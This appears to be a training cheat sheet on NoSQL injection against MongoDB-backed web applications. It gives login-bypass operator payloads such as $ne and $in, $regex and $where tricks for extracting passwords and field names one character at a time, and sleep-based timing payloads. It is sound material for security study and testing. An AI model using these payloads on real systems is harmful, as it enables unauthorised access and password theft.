##### Payloads
```
'
\'

{"$ne":"0"}
{"$gt":"0"}
{"$lt":"0"}
{"$regex":"^.*$"}

' && 0 && 'x
' && 1 && 'x

'||'1'=='1

'%00

"username":{"$in":["admin","administrator","superadmin"]}
"password":{"$ne":""}

?username=admin&password[$ne]=test

```
##### JSON Operators
```
`$where` - Matches documents that satisfy a JavaScript expression.
`$ne` - Matches all values that are not equal to a specified value.
`$in` - Matches all of the values specified in an array.
`$regex` - Selects documents where values match a specified regular expression.
```
### Submitting query operators
In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.
### Boolean Blind-Based
```
{"$regex":"^a.*$"}
{"$regex":"^b.*$"}
{"$regex":"^c.*$"} (true)

{"$regex":"^ca.*$"}
{"$regex":"^cb.*$"} (true)

{"$regex":"^cba.*$"}
{"$regex":"^cbb.*$"}
{"$regex":"^cbc.*$"} (true), etc.
```
# Example NoSQL Attack
### Typical MongoDB query
`db.collection.find({username:'admin', password:'admin123'})`
### Using a JSON operator for injection:
> JSON Operator (input into the password field): 
> 	`{"$ne":"0"}`

> Backend query will become:
	`db.collection.find({username:'admin', password:{"$ne":"0"}})`
												^ is the same as AND password != 0 in SQLi

## More Details
## Exploiting syntax injection to extract data

In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.

### Exfiltrating data in MongoDB

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:

`https://insecure-website.com/user/lookup?username=admin`

This results in the following NoSQL query of the `users` collection:

`{"$where":"this.username == 'admin'"}`

As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:

`admin' && this.password[0] == 'a' || 'a'=='b`

This returns the first character of the user's password string, enabling you to extract the password character by character.

You could also use the JavaScript `match()` function to extract information. For example, the following payload enables you to identify whether the password contains digits:

`admin' && this.password.match(/\d/) || 'a'=='b`

#### Identifying field names

Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.

For example, to identify whether the MongoDB database contains a `password` field, you could submit the following payload:

`https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`

Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the `username` field exists, so you could send the following payloads:

`admin' && this.username!='` `admin' && this.foo!='`

If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).

If you want to test different field names, you could perform a dictionary attack, by using a wordlist to cycle through different potential field names.

#### Note

You can alternatively use NoSQL operator injection to extract field names character by character. This enables you to identify field names without having to guess or perform a dictionary attack. We'll teach you how to do this in the next section.

## Exploiting NoSQL operator injection to extract data

Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.

### Injecting operators in MongoDB

Consider a vulnerable application that accepts username and password in the body of a `POST` request:

`{"username":"wiener","password":"peter"}`

To test whether you can inject operators, you could try adding the `$where` operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:

`{"username":"wiener","password":"peter", "$where":"0"}`
`{"username":"wiener","password":"peter", "$where":"1"}`

If there is a difference between the responses, this may indicate that the JavaScript expression in the `$where` clause is being evaluated.

#### Extracting field names

If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:

`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`

This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character.

#### Exfiltrating data using operators

Alternatively, you may be able to extract data using operators that don't enable you to run JavaScript. For example, you may be able to use the `$regex` operator to extract data character by character.

Consider a vulnerable application that accepts a username and password in the body of a `POST` request. For example:

`{"username":"myuser","password":"mypass"}`

You could start by testing whether the `$regex` operator is processed as follows:

`{"username":"admin","password":{"$regex":"^.*"}}`

If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:

`{"username":"admin","password":{"$regex":"^a*"}}`

## Timing based injection

Sometimes triggering a database error doesn't cause a difference in the application's response. In this situation, you may still be able to detect and exploit the vulnerability by using JavaScript injection to trigger a conditional time delay.

To conduct timing-based NoSQL injection:

1. Load the page several times to determine a baseline loading time.
2. Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, `{"$where": "sleep(5000)"}` causes an intentional delay of 5000 ms on successful injection.
3. Identify whether the response loads more slowly. This indicates a successful injection.

The following timing based payloads will trigger a time delay if the password beings with the letter `a`:

`admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'``admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
